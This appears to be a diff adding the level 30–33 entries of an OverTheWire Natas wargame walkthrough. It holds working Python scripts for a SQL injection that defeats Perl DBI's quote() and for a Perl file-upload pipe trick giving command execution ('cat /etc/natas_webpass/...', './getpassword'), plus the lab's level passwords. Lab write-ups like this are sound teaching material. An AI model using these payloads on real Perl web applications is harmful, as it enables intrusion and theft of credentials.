@@ -808,3 +808,98 @@ WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
 Username: natas30
 URL:      http://natas30.natas.labs.overthewire.org
 ```
+
+Another username and password entry, this time it's a perl website.
+
+Looking at the source code it seems to call an SQL query, as shown here
+
+```perl
+my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 
+```
+
+However we can't just post a SQL injection normally because of the `quote()` function, which escapes all quotation marks that gets passed through.
+
+Apparantly the `quote()` function is vulnerable, as the function can accept a second parameter that tells it which data type to look for in the username/password. For example, if we tell it to parse our password as an integer, the function won't be able to escape our quotes, allowing SQL injection to take place. 
+
+We can do this by passing our `username` as `natas31` as usual, but also passing two `password` values. One password will be `'nah' or 1 = 1;#`, while the other will be just `4`. The 4 represents an ODBC datatype code for integers.
+
+Since neither passing it through the input nor passing it as an URL get parameter work for me, I decided to code it in python.
+
+```python
+import requests
+target = "http://natas30.natas.labs.overthewire.org/index.pl"
+webauth = ('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
+
+r = requests.post(target,
+auth = webauth,
+data = { "username": "natas31", "password": ["'nah' or 1 = 1;#", 4] }
+)
+print ((r.text.split("natas31")[-1])[:32])
+```
+
+Running it gives the password to the next level.
+
+```
+m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
+```
+
+# 31
+
+```
+Username: natas31
+URL:      http://natas31.natas.labs.overthewire.org
+```
+
+This website allows us to post a .csv file and view it inside the web page. Looking at the source code, however, it doesn't check what files you upload. You can upload any readable text file and it'll show up at the website.
+
+```perl
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    ...
+```
+
+While looking for vulnurabilities for the `upload()` function in perl, I found out that you can trick perl into executing bash commands through post, by passing it as an URL parameter and adding a pipe at the end. For example, instead of doing `/index.pl` normally, we can do `/index.pl?(cmd)|`.  We also have to post `ARGV`  in the form data to read the parameter, and a sample file to get it to work. Both must be sent as `file`
+
+I did this in python again, trying to get the website to print the password for natas32:
+
+```python
+import requests
+target = "http://natas31.natas.labs.overthewire.org/index.pl"
+webauth = ('natas31', 'm7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y')
+cmd = "cat /etc/natas_webpass/natas32"
+
+r = requests.post(target + "?" + cmd + " |",
+auth = webauth,
+data = {'file': 'ARGV'},
+files = {'file': ('sample.csv','lalalal', 'text/csv')}
+)
+print (r.text.split('<tr><th>')[-1][:32])
+```
+
+Doing this will get you the password for the next file
+
+```
+NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+```
+
+# 32
+
+```
+Username: natas32
+URL:      http://natas32.natas.labs.overthewire.org
+```
+
+This is the same website as the previous level, so you can copy the python code from the previous level. However, going to `/etc/natas_webpass/natas32` will not work. It seems the password isn't in that location for some reason. Instead, the website states `This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.`
+
+Doing `ls .` command will returl all the files in the webroot. I noticed that there's a file called `getpassword`, which I assume is the binary file. Run it by doing `./getpassword`, and you'll get the password for level 33.
+
+```
+2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
+```
+
+# 33
+
+```
+Username: natas33
+URL:      http://natas33.natas.labs.overthewire.org
+```
